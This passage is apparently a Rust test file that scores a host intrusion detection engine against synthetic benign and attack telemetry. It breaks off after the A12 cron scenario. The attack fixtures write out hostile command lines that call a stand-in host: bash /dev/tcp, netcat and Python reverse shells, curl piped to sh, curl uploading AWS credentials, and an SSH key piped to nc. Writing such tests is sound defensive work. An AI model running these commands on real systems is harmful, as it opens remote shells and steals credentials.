// Adapted RULEAUDIT2-A2 synthetic precision/recall scenarios.
// Uses canonical default temporal/L4 families plus remaining bootstrap YAML
// and L1 seeds, not a hand-copied alternate production template list.
// Fixtures deliberately share session_id=1 to guard against host-wide joins.
// Directory packs and native telemetry qualification are separate owner gates.
use detection::{Confidence, DetectionEngine, EventClass, Layer4Engine, TelemetryEvent};

const BOOTSTRAP: &str = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");

fn raw_consts(prefix: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = BOOTSTRAP;
    while let Some(i) = rest.find(prefix) {
        rest = &rest[i..];
        let start = rest.find("r#\"").unwrap() + 3;
        let end = rest[start..].find("\"#;").unwrap() + start;
        out.push(rest[start..end].to_string());
        rest = &rest[end..];
    }
    out
}

fn string_list(after: &str) -> Vec<String> {
    let i = BOOTSTRAP.find(after).unwrap();
    let body = &BOOTSTRAP[i..];
    let end = body.find("]);").unwrap();
    let body = &body[..end];
    let mut out = Vec::new();
    for line in body.lines() {
        let t = line.trim();
        if t.starts_with('"') {
            if let Some(e) = t[1..].find("\".to_string()") {
                out.push(t[1..1 + e].to_string());
            }
        }
    }
    out
}

fn production_engine() -> DetectionEngine {
    let mut d = DetectionEngine::default_with_rules();
    d.layer1
        .load_string_signatures(string_list("detection.layer1.load_string_signatures(["));
    d.layer1
        .load_string_features(string_list("detection.layer1.load_string_features(["));
    let sigmas = raw_consts("const SIGMA_");
    for y in &sigmas {
        d.load_sigma_rule_yaml(y).expect("sigma compiles");
    }
    d
}

#[derive(Clone)]
struct E(TelemetryEvent);

fn base(ts: i64, class: EventClass, pid: u32, ppid: u32, uid: u32, p: &str, parent: &str) -> E {
    E(TelemetryEvent {
        ts_unix: ts,
        event_class: class,
        pid,
        ppid,
        uid,
        process: p.to_string(),
        parent_process: parent.to_string(),
        session_id: 1, // agent-core: parent_chain.last() == PID 1 for nearly every Linux process
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    })
}
impl E {
    fn cmd(mut self, c: &str) -> E {
        self.0.command_line = Some(c.to_string());
        self
    }
    fn path(mut self, f: &str) -> E {
        self.0.file_path = Some(f.to_string());
        self
    }
    fn write(mut self) -> E {
        self.0.file_write = true;
        self
    }
    fn port(mut self, p: u16, ip: &str) -> E {
        self.0.dst_port = Some(p);
        self.0.dst_ip = Some(ip.to_string());
        self
    }
    fn priv_container(mut self) -> E {
        self.0.container_privileged = true;
        self.0.container_runtime = Some("containerd".into());
        self
    }
    fn escape_container(mut self) -> E {
        self.0.container_escape = true;
        self.0.container_runtime = Some("containerd".into());
        self
    }
}
fn exec(ts: i64, pid: u32, ppid: u32, uid: u32, p: &str, parent: &str, cmd: &str, exe: &str) -> E {
    base(ts, EventClass::ProcessExec, pid, ppid, uid, p, parent)
        .cmd(cmd)
        .path(exe)
}
fn open(ts: i64, pid: u32, ppid: u32, uid: u32, p: &str, parent: &str, cmd: &str, f: &str) -> E {
    base(ts, EventClass::FileOpen, pid, ppid, uid, p, parent)
        .cmd(cmd)
        .path(f)
}
fn conn(
    ts: i64,
    pid: u32,
    ppid: u32,
    uid: u32,
    p: &str,
    parent: &str,
    cmd: &str,
    port: u16,
    ip: &str,
) -> E {
    base(ts, EventClass::NetworkConnect, pid, ppid, uid, p, parent)
        .cmd(cmd)
        .port(port, ip)
}
fn modload(ts: i64, pid: u32, ppid: u32, uid: u32, p: &str, parent: &str, m: &str) -> E {
    base(ts, EventClass::ModuleLoad, pid, ppid, uid, p, parent).path(m)
}

fn sev(c: Confidence) -> &'static str {
    // agent-core detection_event.rs:14 confidence_to_severity
    match c {
        Confidence::Definite => "critical",
        Confidence::VeryHigh => "high(very_high:kill+quarantine tier)",
        Confidence::High => "high",
        Confidence::Medium => "medium",
        Confidence::Low => "low",
        Confidence::None => "none",
    }
}

fn run(id: &str, kind: &str, events: Vec<E>) -> (Vec<String>, Vec<String>, Confidence) {
    let mut d = production_engine();
    let mut th: Vec<String> = Vec::new();
    let mut kh: Vec<String> = Vec::new();
    let mut max = Confidence::None;
    let mut detail = Vec::new();
    let mut gate_any = false;
    for (i, e) in events.iter().enumerate() {
        let o = d.process_event(&e.0);
        // mirrors agent-core response_pipeline.rs:319-349 has_concrete_response_evidence (deception/exact-IOC branches n/a here)
        let cats = [
            !o.temporal_hits.is_empty(),
            !o.kill_chain_hits.is_empty(),
            !o.yara_hits.is_empty(),
            !o.exploit_indicators.is_empty(),
            !o.tamper_indicators.is_empty(),
        ];
        let gate = o.confidence >= Confidence::VeryHigh && cats.iter().filter(|c| **c).count() >= 2;
        gate_any |= gate;
        if !o.temporal_hits.is_empty()
            || !o.kill_chain_hits.is_empty()
            || o.confidence >= Confidence::Medium
        {
            detail.push(format!(
                "ev{}:{}:{}:{} T={:?} K={:?} L1pre={} exploit={:?} tamper={:?} ml={:?} conf={:?} local_kill_gate={}",
                i,
                e.0.event_class.as_str(),
                e.0.pid,
                e.0.process,
                o.temporal_hits,
                o.kill_chain_hits,
                o.signals.l1_prefilter_hit,
                o.exploit_indicators,
                o.tamper_indicators,
                o.ml_score.as_ref().map(|m| (m.positive, (m.score * 100.0).round() / 100.0)),
                o.confidence,
                gate
            ));
        }
        for h in o.temporal_hits {
            if !th.contains(&h) {
                th.push(h);
            }
        }
        for h in o.kill_chain_hits {
            if !kh.contains(&h) {
                kh.push(h);
            }
        }
        if o.confidence > max {
            max = o.confidence;
        }
    }
    println!(
        "RA2A2|{}|{}|temporal={:?}|killchain={:?}|max_conf={:?}|severity={}|agent_kill_quarantine_gate_if_autonomous={}",
        id,
        kind,
        th,
        kh,
        max,
        sev(max),
        gate_any
    );
    for l in detail {
        println!("RA2A2-DETAIL|{}|{}", id, l);
    }
    if kind == "benign" && id != "B19_chrome_after_update_meminfo_deleted_exe" {
        assert!(max < Confidence::High, "{id}: benign HIGH {th:?} {kh:?}");
    }
    let expected = match id {
        "A01_bash_devtcp_revshell_4444"
        | "A02_bash_devtcp_revshell_443"
        | "A03_mkfifo_nc_revshell"
        | "A04_python_revshell" => Some((Confidence::High, "phi_reverse_shell")),
        "A05_webshell_phpfpm" | "A06_webshell_apache_modphp" | "W05_win_iis_webshell" => {
            Some((Confidence::High, "phi_webshell"))
        }
        "A07_curl_pipe_sh_sh_first" => Some((Confidence::Medium, "phi_download_pipe_shell")),
        "A08_pwnkit_root_shell" => Some((Confidence::High, "phi_unbrokered_root_shell")),
        "A09_curl_upload_aws_creds_443" | "A10_cat_key_pipe_nc" => {
            Some((Confidence::High, "phi_credential_exfil"))
        }
        "A11_cron_d_backdoor" | "A12_user_crontab_backdoor" => {
            Some((Confidence::Medium, "phi_persistence_write"))
        }
        "A13_systemd_user_unit" => Some((Confidence::High, "phi_persistence_install")),
        "A14_insmod_rootkit" => Some((Confidence::High, "eguard_builtin_kernel_module")),
        "A16_tar_then_nc_upload" => Some((Confidence::High, "phi_data_staging")),
        "A17_ssh_with_stolen_key" => Some((Confidence::Medium, "phi_ssh_unusual_key")),
        "W03_win_mimikatz_sam_read" => Some((Confidence::High, "eguard_win_credential_store_read")),
        _ => None, // A15 needs write metadata; W04 lacks shell I/O evidence.
    };
    if let Some((expected, rule)) = expected {
        assert!(max >= expected, "{id}: missed attack");
        assert!(th.iter().any(|hit| hit == rule), "{id}: missing {rule}");
    }
    if id == "B19_chrome_after_update_meminfo_deleted_exe" {
        assert!(
            th.is_empty() && kh.is_empty(),
            "Chrome must not trigger temporal/L4"
        );
    }
    (th, kh, max)
}

const T0: i64 = 1_800_000_000;
const HOME_KEY: &str = "/home/admin/.ssh/id_ed25519";

#[test]
fn ra2_a2_scenarios() {
    // ---------------- BENIGN (routine admin / user work) ----------------
    // B01 plain interactive `ssh admin@10.0.0.20` (OpenSSH loads identity files BEFORE ssh_connect; ssh.c:1660 vs 1725)
    run(
        "B01_ssh_plain",
        "benign",
        vec![
            exec(
                T0,
                2001,
                2000,
                1000,
                "ssh",
                "bash",
                "ssh admin@10.0.0.20",
                "/usr/bin/ssh",
            ),
            open(
                T0,
                2001,
                2000,
                1000,
                "ssh",
                "bash",
                "ssh admin@10.0.0.20",
                "/home/admin/.ssh/id_rsa",
            ),
            open(
                T0,
                2001,
                2000,
                1000,
                "ssh",
                "bash",
                "ssh admin@10.0.0.20",
                HOME_KEY,
            ),
            conn(
                T0 + 1,
                2001,
                2000,
                1000,
                "ssh",
                "bash",
                "ssh admin@10.0.0.20",
                22,
                "10.0.0.20",
            ),
            open(
                T0 + 1,
                2001,
                2000,
                1000,
                "ssh",
                "bash",
                "ssh admin@10.0.0.20",
                "/home/admin/.ssh/known_hosts",
            ),
        ],
    );
    // B02 `scp app.tar.gz deploy@10.0.0.21:/srv/` -> scp spawns ssh
    run("B02_scp_copy", "benign", vec![
        exec(T0, 2101, 2100, 1000, "scp", "bash", "scp app.tar.gz deploy@10.0.0.21:/srv/", "/usr/bin/scp"),
        exec(T0, 2102, 2101, 1000, "ssh", "scp", "/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l deploy -- 10.0.0.21 scp -t /srv/", "/usr/bin/ssh"),
        open(T0, 2102, 2101, 1000, "ssh", "scp", "ssh -x ... scp -t /srv/", HOME_KEY),
        conn(T0 + 1, 2102, 2101, 1000, "ssh", "scp", "ssh -x ... scp -t /srv/", 22, "10.0.0.21"),
    ]);
    // B03 nightly backup `rsync -az /var/www/ backup@10.0.0.30:/backup/www/` (root cron)
    run(
        "B03_rsync_backup",
        "benign",
        vec![
            exec(
                T0,
                2201,
                2200,
                0,
                "rsync",
                "sh",
                "rsync -az /var/www/ backup@10.0.0.30:/backup/www/",
                "/usr/bin/rsync",
            ),
            exec(
                T0,
                2202,
                2201,
                0,
                "ssh",
                "rsync",
                "ssh -l backup 10.0.0.30 rsync --server -logDtprze.iLsfxCIvu . /backup/www/",
                "/usr/bin/ssh",
            ),
            open(
                T0,
                2202,
                2201,
                0,
                "ssh",
                "rsync",
                "ssh -l backup 10.0.0.30 rsync --server",
                "/root/.ssh/id_ed25519",
            ),
            conn(
                T0 + 1,
                2202,
                2201,
                0,
                "ssh",
                "rsync",
                "ssh -l backup 10.0.0.30 rsync --server",
                22,
                "10.0.0.30",
            ),
        ],
    );
    // B04 `ssh -J bastion app01` (ProxyJump spawns `ssh -W [app01]:22 bastion`)
    run(
        "B04_ssh_proxyjump",
        "benign",
        vec![
            exec(
                T0,
                2301,
                2300,
                1000,
                "ssh",
                "bash",
                "ssh -J bastion app01",
                "/usr/bin/ssh",
            ),
            open(
                T0,
                2301,
                2300,
                1000,
                "ssh",
                "bash",
                "ssh -J bastion app01",
                HOME_KEY,
            ),
            exec(
                T0,
                2302,
                2301,
                1000,
                "ssh",
                "ssh",
                "ssh -W [app01]:22 bastion",
                "/usr/bin/ssh",
            ),
            open(
                T0,
                2302,
                2301,
                1000,
                "ssh",
                "ssh",
                "ssh -W [app01]:22 bastion",
                HOME_KEY,
            ),
            conn(
                T0 + 1,
                2302,
                2301,
                1000,
                "ssh",
                "ssh",
                "ssh -W [app01]:22 bastion",
                22,
                "10.0.0.2",
            ),
        ],
    );
    // B05 deploy script: `#!/bin/bash` started by admin, first command ssh within 10 s
    run(
        "B05_deploy_script_ssh",
        "benign",
        vec![
            exec(
                T0,
                2401,
                2400,
                1000,
                "bash",
                "bash",
                "bash ./deploy.sh",
                "/usr/bin/bash",
            ),
            exec(
                T0 + 2,
                2402,
                2401,
                1000,
                "ssh",
                "bash",
                "ssh app01 sudo systemctl restart app",
                "/usr/bin/ssh",
            ),
            open(
                T0 + 2,
                2402,
                2401,
                1000,
                "ssh",
                "bash",
                "ssh app01 sudo systemctl restart app",
                HOME_KEY,
            ),
            conn(
                T0 + 3,
                2402,
                2401,
                1000,
                "ssh",
                "bash",
                "ssh app01 sudo systemctl restart app",
                22,
                "10.0.0.40",
            ),
        ],
    );
    // B06 interactive `sudo -i`
    run(
        "B06_sudo_i",
        "benign",
        vec![
            exec(
                T0,
                2501,
                2500,
                1000,
                "sudo",
                "bash",
                "sudo -i",
                "/usr/bin/sudo",
            ),
            exec(
                T0 + 3,
                2503,
                2502,
                0,
                "bash",
                "sudo",
                "-bash",
                "/usr/bin/bash",
            ),
        ],
    );
    // B07 Ansible become (every task): sudo -H -S -n -u root /bin/sh -c 'echo BECOME-SUCCESS-x; /usr/bin/python3 ...'
    run("B07_ansible_become", "benign", vec![
        exec(T0, 2601, 2600, 1000, "sudo", "sh", "sudo -H -S -n -u root /bin/sh -c echo BECOME-SUCCESS-abc ; /usr/bin/python3 /home/ansible/.ansible/tmp/AnsiballZ_apt.py", "/usr/bin/sudo"),
        exec(T0 + 1, 2602, 2601, 0, "sh", "sudo", "/bin/sh -c echo BECOME-SUCCESS-abc ; /usr/bin/python3 /home/ansible/.ansible/tmp/AnsiballZ_apt.py", "/usr/bin/dash"),
        exec(T0 + 1, 2603, 2602, 0, "python3", "sh", "/usr/bin/python3 /home/ansible/.ansible/tmp/AnsiballZ_apt.py", "/usr/bin/python3.11"),
    ]);
    // B08 health check curl by a monitor + an UNRELATED cron shell 8 s later (different tree, same session_id=1)
    run(
        "B08_healthcheck_curl_then_unrelated_cron_sh",
        "benign",
        vec![
            exec(
                T0,
                2701,
                900,
                112,
                "curl",
                "zabbix_agentd",
                "curl -fsS http://127.0.0.1:8080/healthz",
                "/usr/bin/curl",
            ),
            conn(
                T0,
                2701,
                900,
                112,
                "curl",
                "zabbix_agentd",
                "curl -fsS http://127.0.0.1:8080/healthz",
                8080,
                "127.0.0.1",
            ),
            exec(
                T0 + 8,
                2801,
                800,
                0,
                "sh",
                "cron",
                "/bin/sh -c [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean",
                "/usr/bin/dash",
            ),
        ],
    );
    // B09 metrics scrape in a shell script (sh -> curl :9100 within 10 s of sh exec)
    run(
        "B09_sh_curl_metrics_9100",
        "benign",
        vec![
            exec(
                T0,
                2901,
                800,
                0,
                "sh",
                "cron",
                "/bin/sh /usr/local/bin/check_node.sh",
                "/usr/bin/dash",
            ),
            exec(
                T0 + 1,
                2902,
                2901,
                0,
                "curl",
                "sh",
                "curl -s http://10.0.0.50:9100/metrics",
                "/usr/bin/curl",
            ),
            conn(
                T0 + 1,
                2902,
                2901,
                0,
                "curl",
                "sh",
                "curl -s http://10.0.0.50:9100/metrics",
                9100,
                "10.0.0.50",
            ),
        ],
    );
    // B10 `sudo modprobe wireguard`
    run(
        "B10_sudo_modprobe",
        "benign",
        vec![
            exec(
                T0,
                3001,
                3000,
                1000,
                "sudo",
                "bash",
                "sudo modprobe wireguard",
                "/usr/bin/sudo",
            ),
            exec(
                T0 + 1,
                3002,
                3001,
                0,
                "modprobe",
                "sudo",
                "modprobe wireguard",
                "/usr/sbin/modprobe",
            ),
            modload(T0 + 1, 3002, 3001, 0, "modprobe", "sudo", "wireguard"),
        ],
    );
    // B11 `kubectl get pods` (reads ~/.kube/config, connects API server :6443)
    run(
        "B11_kubectl_get_pods",
        "benign",
        vec![
            exec(
                T0,
                3101,
                3100,
                1000,
                "kubectl",
                "bash",
                "kubectl get pods -n prod",
                "/usr/local/bin/kubectl",
            ),
            open(
                T0,
                3101,
                3100,
                1000,
                "kubectl",
                "bash",
                "kubectl get pods -n prod",
                "/home/admin/.kube/config",
            ),
            conn(
                T0 + 1,
                3101,
                3100,
                1000,
                "kubectl",
                "bash",
                "kubectl get pods -n prod",
                6443,
                "10.0.0.60",
            ),
        ],
    );
    // B12 Thunderbird start: loads logins.json/key4.db then IMAPS 993
    run(
        "B12_thunderbird_imap",
        "benign",
        vec![
            exec(
                T0,
                3201,
                3200,
                1000,
                "thunderbird",
                "gnome-shell",
                "/usr/lib/thunderbird/thunderbird",
                "/usr/lib/thunderbird/thunderbird",
            ),
            open(
                T0 + 1,
                3201,
                3200,
                1000,
                "thunderbird",
                "gnome-shell",
                "/usr/lib/thunderbird/thunderbird",
                "/home/u/.thunderbird/abcd.default-release/key4.db",
            ),
            open(
                T0 + 1,
                3201,
                3200,
                1000,
                "thunderbird",
                "gnome-shell",
                "/usr/lib/thunderbird/thunderbird",
                "/home/u/.thunderbird/abcd.default-release/logins.json",
            ),
            conn(
                T0 + 2,
                3201,
                3200,
                1000,
                "thunderbird",
                "gnome-shell",
                "/usr/lib/thunderbird/thunderbird",
                993,
                "203.0.113.10",
            ),
        ],
    );
    // B13 developer installs conda/nvm: appends to ~/.bashrc, then ANY unrelated exec on host
    run(
        "B13_bashrc_append_then_any_exec",
        "benign",
        vec![
            open(
                T0,
                3301,
                3300,
                1000,
                "bash",
                "bash",
                "bash install_nvm.sh",
                "/home/dev/.bashrc",
            )
            .write(),
            exec(
                T0 + 5,
                3401,
                1,
                0,
                "logrotate",
                "systemd",
                "/usr/sbin/logrotate /etc/logrotate.conf",
                "/usr/sbin/logrotate",
            ),
        ],
    );
    // B14 `systemctl edit nginx` writes a drop-in under /etc/systemd/system
    run(
        "B14_systemctl_edit",
        "benign",
        vec![
            exec(
                T0,
                3501,
                3500,
                0,
                "systemctl",
                "bash",
                "systemctl edit nginx",
                "/usr/bin/systemctl",
            ),
            open(
                T0 + 1,
                3501,
                3500,
                0,
                "systemctl",
                "bash",
                "systemctl edit nginx",
                "/etc/systemd/system/nginx.service.d/.#override.conf3f2a",
            )
            .write(),
        ],
    );
    // B15 certbot package install drops /etc/cron.d/certbot (dpkg), unrelated exec follows
    run("B15_dpkg_writes_cron_d", "benign", vec![
        open(T0, 3601, 3600, 0, "dpkg", "apt", "/usr/bin/dpkg --status-fd 23 --unpack --auto-deconfigure /var/cache/apt/archives/certbot_2.1.0-4_all.deb", "/etc/cron.d/certbot.dpkg-new").write(),
        exec(T0 + 1, 3602, 3600, 0, "dpkg-deb", "dpkg", "dpkg-deb --fsys-tarfile /var/cache/apt/archives/certbot_2.1.0-4_all.deb", "/usr/bin/dpkg-deb"),
    ]);
    // B16 `kubectl exec -it pod -- bash -i` (kubectl cmdline contains "bash -i", connects 6443)
    run(
        "B16_kubectl_exec_bash_i",
        "benign",
        vec![
            exec(
                T0,
                3701,
                3700,
                1000,
                "kubectl",
                "bash",
                "kubectl exec -it web-0 -- bash -i",
                "/usr/local/bin/kubectl",
            ),
            conn(
                T0 + 1,
                3701,
                3700,
                1000,
                "kubectl",
                "bash",
                "kubectl exec -it web-0 -- bash -i",
                6443,
                "10.0.0.60",
            ),
        ],
    );
    // B17 curl to Elasticsearch with an Accept-Encoding header (cmdline contains "gzip ")
    run(
        "B17_curl_es_gzip_header",
        "benign",
        vec![
            exec(
                T0,
                3801,
                3800,
                1000,
                "curl",
                "bash",
                "curl -H Accept-Encoding: gzip http://10.0.0.70:9200/_cat/indices",
                "/usr/bin/curl",
            ),
            conn(
                T0,
                3801,
                3800,
                1000,
                "curl",
                "bash",
                "curl -H Accept-Encoding: gzip http://10.0.0.70:9200/_cat/indices",
                9200,
                "10.0.0.70",
            ),
        ],
    );
    // B18 git push over ssh from a terminal opened 5 s ago
    run("B18_git_push_ssh", "benign", vec![
        exec(T0, 3901, 3900, 1000, "git", "bash", "git push origin main", "/usr/bin/git"),
        exec(T0, 3902, 3901, 1000, "ssh", "git", "/usr/bin/ssh -o SendEnv=GIT_PROTOCOL git@github.com git-receive-pack 'org/repo.git'", "/usr/bin/ssh"),
        open(T0, 3902, 3901, 1000, "ssh", "git", "/usr/bin/ssh -o SendEnv=GIT_PROTOCOL git@github.com", HOME_KEY),
        conn(T0 + 1, 3902, 3901, 1000, "ssh", "git", "/usr/bin/ssh -o SendEnv=GIT_PROTOCOL git@github.com", 22, "140.82.121.4"),
    ]);
    // B19 Chrome after auto-update: browser polls /proc/meminfo, spawns /proc/self/exe now resolving to "(deleted)"
    run(
        "B19_chrome_after_update_meminfo_deleted_exe",
        "benign",
        vec![
            open(
                T0,
                4001,
                4000,
                1000,
                "chrome",
                "gnome-shell",
                "/opt/google/chrome/chrome",
                "/proc/meminfo",
            ),
            exec(
                T0 + 1,
                4002,
                4001,
                1000,
                "chrome",
                "chrome",
                "/opt/google/chrome/chrome --type=renderer",
                "/opt/google/chrome/chrome (deleted)",
            ),
        ],
    );
    // B20 hostPID monitoring DaemonSet (node-exporter) / privileged CNI pod: every new process
    run(
        "B20_k8s_hostpid_privileged_pods",
        "benign",
        vec![
            exec(
                T0,
                4101,
                4100,
                0,
                "calico-node",
                "runsv",
                "calico-node -felix",
                "/bin/calico-node",
            )
            .priv_container(),
            exec(
                T0 + 1,
                4102,
                4100,
                65534,
                "node_exporter",
                "containerd-shim",
                "/bin/node_exporter --path.procfs=/host/proc",
                "/bin/node_exporter",
            )
            .escape_container(),
        ],
    );
    // B21 sysadmin hardening: `sysctl -w kernel.yama.ptrace_scope=1` -> no fileless child; included to show ptrace substring
    run(
        "B21_sysctl_ptrace_scope",
        "benign",
        vec![exec(
            T0,
            4201,
            4200,
            0,
            "sysctl",
            "bash",
            "sysctl -w kernel.yama.ptrace_scope=1",
            "/usr/sbin/sysctl",
        )],
    );
    // B22 Postgres client from a fresh interactive shell (terminal just opened)
    run(
        "B22_new_terminal_psql",
        "benign",
        vec![
            exec(
                T0,
                4301,
                4300,
                1000,
                "bash",
                "gnome-terminal-server",
                "bash",
                "/usr/bin/bash",
            ),
            exec(
                T0 + 4,
                4302,
                4301,
                1000,
                "psql",
                "bash",
                "psql -h db01 -U app",
                "/usr/bin/psql",
            ),
            conn(
                T0 + 4,
                4302,
                4301,
                1000,
                "psql",
                "bash",
                "psql -h db01 -U app",
                5432,
                "10.0.0.80",
            ),
        ],
    );

    // ---------------- ATTACKS (must stay detected) ----------------
    // A01 classic /dev/tcp reverse shell (bash -c one-shot exec: connect happens in the same pid before re-exec)
    run(
        "A01_bash_devtcp_revshell_4444",
        "attack",
        vec![
            exec(
                T0,
                5001,
                5000,
                33,
                "bash",
                "sh",
                "bash -c bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
                "/usr/bin/bash",
            ),
            conn(
                T0,
                5001,
                5000,
                33,
                "bash",
                "sh",
                "bash -c bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
                4444,
                "198.51.100.7",
            ),
        ],
    );
    // A02 same reverse shell to port 443
    run(
        "A02_bash_devtcp_revshell_443",
        "attack",
        vec![
            exec(
                T0,
                5101,
                5100,
                33,
                "bash",
                "sh",
                "bash -c bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
                "/usr/bin/bash",
            ),
            conn(
                T0,
                5101,
                5100,
                33,
                "bash",
                "sh",
                "bash -c bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
                443,
                "198.51.100.7",
            ),
        ],
    );
    // A03 mkfifo + nc reverse shell (most common one-liner)
    run(
        "A03_mkfifo_nc_revshell",
        "attack",
        vec![
            exec(
                T0,
                5201,
                5200,
                33,
                "sh",
                "php-fpm8.2",
                "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f",
                "/usr/bin/dash",
            ),
            exec(T0, 5202, 5201, 33, "sh", "sh", "sh -i", "/usr/bin/dash"),
            exec(
                T0,
                5203,
                5201,
                33,
                "nc",
                "sh",
                "nc 198.51.100.7 4444",
                "/usr/bin/nc.openbsd",
            ),
            conn(
                T0,
                5203,
                5201,
                33,
                "nc",
                "sh",
                "nc 198.51.100.7 4444",
                4444,
                "198.51.100.7",
            ),
        ],
    );
    // A04 python reverse shell
    run("A04_python_revshell", "attack", vec![
        exec(T0, 5301, 5300, 33, "python3", "sh", "python3 -c import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.7\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")", "/usr/bin/python3.11"),
        conn(T0, 5301, 5300, 33, "python3", "sh", "python3 -c import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.7\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")", 4444, "198.51.100.7"),
        exec(T0 + 1, 5302, 5301, 33, "sh", "python3", "/bin/sh", "/usr/bin/dash"),
    ]);
    // A05 webshell: long-running nginx -> php-fpm -> sh -> curl to C2:8000 (nginx exec'd 1 day ago)
    run(
        "A05_webshell_phpfpm",
        "attack",
        vec![
            exec(
                T0 - 86_400,
                600,
                1,
                0,
                "nginx",
                "systemd",
                "nginx: master process /usr/sbin/nginx",
                "/usr/sbin/nginx",
            ),
            exec(
                T0 - 86_400,
                700,
                1,
                0,
                "php-fpm8.2",
                "systemd",
                "php-fpm: master process",
                "/usr/sbin/php-fpm8.2",
            ),
            conn(
                T0 - 10,
                600,
                1,
                0,
                "nginx",
                "systemd",
                "nginx: worker process",
                9000,
                "127.0.0.1",
            ),
            exec(
                T0,
                5401,
                701,
                33,
                "sh",
                "php-fpm8.2",
                "sh -c id;uname -a;curl -s http://198.51.100.7:8000/x|sh",
                "/usr/bin/dash",
            ),
            exec(
                T0,
                5402,
                5401,
                33,
                "curl",
                "sh",
                "curl -s http://198.51.100.7:8000/x",
                "/usr/bin/curl",
            ),
            conn(
                T0,
                5402,
                5401,
                33,
                "curl",
                "sh",
                "curl -s http://198.51.100.7:8000/x",
                8000,
                "198.51.100.7",
            ),
            exec(T0 + 1, 5403, 5401, 33, "sh", "sh", "sh", "/usr/bin/dash"),
        ],
    );
    // A06 webshell directly under apache2 (mod_php), long-running parent
    run(
        "A06_webshell_apache_modphp",
        "attack",
        vec![
            exec(
                T0 - 86_400,
                610,
                1,
                0,
                "apache2",
                "systemd",
                "/usr/sbin/apache2 -k start",
                "/usr/sbin/apache2",
            ),
            exec(
                T0,
                5501,
                610,
                33,
                "sh",
                "apache2",
                "sh -c nc -e /bin/sh 198.51.100.7 4444",
                "/usr/bin/dash",
            ),
            exec(
                T0,
                5502,
                5501,
                33,
                "nc",
                "sh",
                "nc -e /bin/sh 198.51.100.7 4444",
                "/usr/bin/nc.traditional",
            ),
            conn(
                T0,
                5502,
                5501,
                33,
                "nc",
                "sh",
                "nc -e /bin/sh 198.51.100.7 4444",
                4444,
                "198.51.100.7",
            ),
        ],
    );
    // A07 curl | sh where sh exec is observed BEFORE curl (pipeline siblings race)
    run(
        "A07_curl_pipe_sh_sh_first",
        "attack",
        vec![
            exec(T0, 5602, 5600, 1000, "sh", "bash", "sh", "/usr/bin/dash"),
            exec(
                T0,
                5601,
                5600,
                1000,
                "curl",
                "bash",
                "curl -fsSL http://198.51.100.7/i.sh",
                "/usr/bin/curl",
            ),
            conn(
                T0,
                5601,
                5600,
                1000,
                "curl",
                "bash",
                "curl -fsSL http://198.51.100.7/i.sh",
                80,
                "198.51.100.7",
            ),
        ],
    );
    // A08 PwnKit-style privesc: exploit (uid 1000) -> pkexec -> /bin/sh as root, parent = exploit not sudo
    run(
        "A08_pwnkit_root_shell",
        "attack",
        vec![
            exec(
                T0,
                5701,
                5700,
                1000,
                "pwnkit",
                "bash",
                "./pwnkit",
                "/tmp/.x/pwnkit",
            ),
            exec(
                T0,
                5702,
                5701,
                1000,
                "pkexec",
                "pwnkit",
                "",
                "/usr/bin/pkexec",
            ),
            exec(
                T0 + 1,
                5702,
                5701,
                0,
                "sh",
                "pwnkit",
                "/bin/sh",
                "/usr/bin/dash",
            ),
        ],
    );
    // A09 credential exfil over HTTPS: curl uploads ~/.aws/credentials to 443
    run(
        "A09_curl_upload_aws_creds_443",
        "attack",
        vec![
            exec(
                T0,
                5801,
                5800,
                1000,
                "curl",
                "bash",
                "curl -F f=@/home/u/.aws/credentials https://198.51.100.7/up",
                "/usr/bin/curl",
            ),
            open(
                T0,
                5801,
                5800,
                1000,
                "curl",
                "bash",
                "curl -F f=@/home/u/.aws/credentials https://198.51.100.7/up",
                "/home/u/.aws/credentials",
            ),
            conn(
                T0,
                5801,
                5800,
                1000,
                "curl",
                "bash",
                "curl -F f=@/home/u/.aws/credentials https://198.51.100.7/up",
                443,
                "198.51.100.7",
            ),
        ],
    );
    // A10 key theft: cat id_rsa | nc attacker 4444 (siblings)
    run(
        "A10_cat_key_pipe_nc",
        "attack",
        vec![
            exec(
                T0,
                5901,
                5900,
                1000,
                "cat",
                "bash",
                "cat /home/u/.ssh/id_rsa",
                "/usr/bin/cat",
            ),
            open(
                T0,
                5901,
                5900,
                1000,
                "cat",
                "bash",
                "cat /home/u/.ssh/id_rsa",
                "/home/u/.ssh/id_rsa",
            ),
            exec(
                T0,
                5902,
                5900,
                1000,
                "nc",
                "bash",
                "nc 198.51.100.7 4444",
                "/usr/bin/nc.openbsd",
            ),
            conn(
                T0,
                5902,
                5900,
                1000,
                "nc",
                "bash",
                "nc 198.51.100.7 4444",
                4444,
                "198.51.100.7",
            ),
        ],
    );
    // A11 cron persistence via /etc/cron.d (root shell redirect)
    run(
        "A11_cron_d_backdoor",
        "attack",
        vec![
            open(
                T0,
                6001,
                6000,
                0,
                "bash",
                "bash",
                "bash",
                "/etc/cron.d/0hourly-sync",
            )
            .write(),
            exec(
                T0 + 2,
                6002,
                6000,
                0,
                "chmod",
                "bash",
                "chmod 644 /etc/cron.d/0hourly-sync",
                "/usr/bin/chmod",
            ),
        ],
    );
    // A12 user crontab persistence (crontab writes /var/spool/cron/crontabs)
    run(
        "A12_user_crontab_backdoor",
        "attack",
        vec![
            exec(
                T0,
                6101,
                6100,
                1000,
                "crontab",
                "bash",
                "crontab -",
                "/usr/bin/crontab",
            ),
            open(
                T0,
                6101,
                6100,
                1000,
                "crontab",
                "bash",
                "crontab -",
                "/var/spool/cron/crontabs/tmp.Xa1b2",
            )
            .write(),
        ],
    );
